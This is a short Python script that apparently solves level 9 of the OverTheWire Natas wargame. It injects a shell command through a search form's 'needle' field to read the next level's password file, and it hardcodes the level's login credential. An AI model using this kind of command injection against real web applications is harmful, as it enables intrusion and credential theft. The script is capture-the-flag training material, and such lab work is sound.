#!/usr/bin/env python
# COMMAND INJECTION
import requests
import re

username='natas9'
password='W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = 'index-source.html'
# response = requests.get(url+path, auth = (username, password))
response = requests.post(url, data={'needle':'. /etc/natas_webpass/natas10;', 'submit':'submit'}, auth = (username, password)) # The '.' matches all the entries in the natas10 file and the ";" makes anything after that as another command
content = response.text

# print content

print re.findall('<pre>\n(.*)\n</pre>', content)[0]
# This level was pretty easy as the there was a textbox from where you could search keywords from a file and just inject a commnand in it